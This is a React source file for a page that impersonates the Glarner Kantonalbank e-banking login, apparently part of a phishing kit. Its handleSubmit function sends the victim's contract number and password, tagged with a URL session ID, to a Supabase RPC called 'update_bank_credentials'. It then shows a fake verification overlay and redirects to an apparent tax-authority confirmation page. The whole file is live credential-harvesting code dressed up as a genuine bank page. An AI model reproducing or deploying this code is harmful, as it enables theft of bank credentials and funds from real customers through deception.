import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ArrowLeft, ArrowRight } from "lucide-react";
import logoAsset from "@/assets/glarner-kantonalbank-logo.png.asset.json";
import vermoegenAsset from "@/assets/glkb-vermoegen.jpg.asset.json";
import glarixAsset from "@/assets/glkb-glarix.jpg.asset.json";

const RED = "#c70522";

const slides = [
  {
    image: vermoegenAsset.url,
    title: "Vermögen aufbauen. Werte bewahren.",
    text: "Von der erfolgreichen Ausbildung über den beruflichen Aufstieg bis hin zum Generationenwechsel: jede Lebensphase hat ihre besonderen...",
    linkText: "Mehr erfahren",
  },
  {
    image: glarixAsset.url,
    title: "Glarix entdecken!",
    text: "Glarix - Die digitalen Angebote der Glarner Kantonalbank. Moderne Produkte, attraktive Konditionen und coole Aktionen vereint...",
    linkText: "Mehr erfahren",
  },
];

const ChGlarnerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide, setActiveSlide] = useState(0);
  const touchStartX = useRef(0);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Glarner Kantonalbank – E-Banking", logoAsset.url);

  const nextSlide = () => setActiveSlide((s) => (s + 1) % slides.length);
  const prevSlide = () => setActiveSlide((s) => (s - 1 + slides.length) % slides.length);

  useEffect(() => {
    const id = setInterval(() => {
      setActiveSlide((s) => (s + 1) % slides.length);
    }, 5000);
    return () => clearInterval(id);
  }, []);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Roter Header-Balken full-width */}
        <div
          className="w-full flex items-center px-6 md:px-12"
          style={{ height: 75, backgroundColor: RED }}
        >
          <img
            src={logoAsset.url}
            alt="Glarner Kantonalbank"
            className="h-[42px] w-auto"
          />
        </div>

        <main className="flex-1 px-0 md:px-4">
          <div
            className="w-full md:max-w-[988px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:aspect-[988/700] md:border md:border-[#d9d9d9]"
          >
            <div className="flex flex-col md:flex-row h-full">
              {/* Left column: form */}
              <div className="md:w-1/2 flex flex-col">
                <div className="px-8 py-10 flex flex-col flex-1">
                  <h1 className="text-[20px] md:text-[22px] font-bold text-black mb-2">
                    Willkommen bei der Glarner Kantonalbank
                  </h1>
                  <p className="text-[14px] mb-8" style={{ color: "#444" }}>
                    Bitte melden Sie sich an, um fortzufahren.
                  </p>

                  <div className="mb-5">
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Vertragsnummer
                    </label>
                    <input
                      type="text"
                      value={vertragsnummer}
                      onChange={(e) => setVertragsnummer(e.target.value)}
                      className="w-full px-3 py-2.5 border outline-none text-[15px] rounded-[5px] border-[#cccccc] hover:border-[#c70522] focus:border-transparent focus:shadow-[0_0_0_4px_rgba(199,5,34,0.15),0_2px_8px_rgba(0,0,0,0.12)] transition-all"
                      style={{ backgroundColor: "#fff" }}
                    />
                  </div>

                  <div className="mb-8">
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Passwort
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={passwort}
                        onChange={(e) => setPasswort(e.target.value)}
                        className="w-full px-3 py-2.5 border outline-none text-[15px] pr-10 rounded-[5px] border-[#cccccc] hover:border-[#c70522] focus:border-transparent focus:shadow-[0_0_0_4px_rgba(199,5,34,0.15),0_2px_8px_rgba(0,0,0,0.12)] transition-all"
                        style={{ backgroundColor: "#fff" }}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2"
                        aria-label="Passwort anzeigen"
                      >
                        {showPassword ? (
                          <EyeOff size={18} color={RED} />
                        ) : (
                          <Eye size={18} color={RED} />
                        )}
                      </button>
                    </div>
                  </div>

                  <div className="flex-1" />

                  <button
                    onClick={handleSubmit}
                    className="mx-auto w-full max-w-[160px] py-2.5 text-white font-semibold text-[15px] rounded-[4px] border border-transparent bg-[#c70522] hover:bg-black hover:border-[#c70522] transition-colors"
                  >
                    Weiter
                  </button>

                  <a
                    href="#"
                    className="mt-4 text-center text-[14px]"
                    style={{ color: RED }}
                  >
                    Passwort zurücksetzen
                  </a>

                  <p className="mt-4 text-center text-[14px]" style={{ color: "#555" }}>
                    Zugang gefährdet?{" "}
                    <a href="#" style={{ color: RED }}>
                      Mein Konto sperren
                    </a>
                  </p>
                </div>
              </div>

              {/* Mobile separator */}
              <div className="md:hidden h-[30px] w-full" style={{ backgroundColor: "#f5f5f5" }} />

              {/* Right column: carousel */}
              <div className="md:w-1/2 flex flex-col">
                <div
                  className="relative flex-1 min-h-[360px] overflow-hidden"
                  onTouchStart={(e) => { touchStartX.current = e.touches[0].clientX; }}
                  onTouchEnd={(e) => {
                    const dx = e.changedTouches[0].clientX - touchStartX.current;
                    if (dx > 40) prevSlide();
                    else if (dx < -40) nextSlide();
                  }}
                >
                  {slides.map((s, i) => (
                    <img
                      key={i}
                      src={s.image}
                      alt={s.title}
                      className="absolute inset-0 w-full h-full object-cover transition-opacity duration-700"
                      style={{ opacity: i === activeSlide ? 1 : 0 }}
                    />
                  ))}

                  {/* Always visible arrows */}
                  <button
                    onClick={prevSlide}
                    aria-label="Vorheriges Bild"
                    className="absolute left-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: RED }}
                  >
                    <ArrowLeft size={20} color="#fff" />
                  </button>
                  <button
                    onClick={nextSlide}
                    aria-label="Nächstes Bild"
                    className="absolute right-3 top-1/2 -translate-y-1/2 w-10 h-10 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: RED }}
                  >
                    <ArrowRight size={20} color="#fff" />
                  </button>

                  {/* Text panel */}
                  <div
                    className="absolute left-4 right-4 bottom-4 px-5 py-4 backdrop-blur-md rounded-md"
                    style={{ backgroundColor: "rgba(255,255,255,0.78)" }}
                  >
                    <h3 className="font-bold text-[14px] mb-1 text-black">
                      {slides[activeSlide].title}
                    </h3>
                    <p className="text-[13px] leading-snug mb-1" style={{ color: "#333" }}>
                      {slides[activeSlide].text}{" "}
                      <a href="#" style={{ color: RED }}>
                        {slides[activeSlide].linkText}
                      </a>
                    </p>

                    <div className="flex items-center justify-center gap-2 mt-3">
                      {slides.map((_, i) => (
                        <button
                          key={i}
                          onClick={() => setActiveSlide(i)}
                          aria-label={`Slide ${i + 1}`}
                          className="rounded-full transition-all"
                          style={{
                            height: 8,
                            width: 8,
                            backgroundColor: i === activeSlide ? RED : "#bbb",
                          }}
                        />
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-0 md:mt-12 bg-white">
          <div
            className="max-w-[1100px] mx-auto px-4 md:px-8 py-4 text-[13px] flex flex-col-reverse items-center gap-2 md:flex-row md:justify-between"
            style={{ color: "#666" }}
          >
            <span>© Glarner Kantonalbank 2026</span>
            <div className="flex flex-nowrap items-center justify-center gap-x-3 md:gap-x-6 whitespace-nowrap text-[11px] md:text-[13px]">
              <a href="https://glkb.ch/rechtliches" style={{ color: RED }} className="hover:!text-black">Rechtliches</a>
              <a href="https://glkb.ch/verlinkung-rechtliches-datenschutz" style={{ color: RED }} className="hover:!text-black">Datenschutz</a>
              <a href="https://glkb.ch/verlinkung-cookie-policy" style={{ color: RED }} className="hover:!text-black">Cookie Policy</a>
              <a href="https://glkb.ch/verlinkung-impressum" style={{ color: RED }} className="hover:!text-black">Impressum</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChGlarnerKantonalbank;
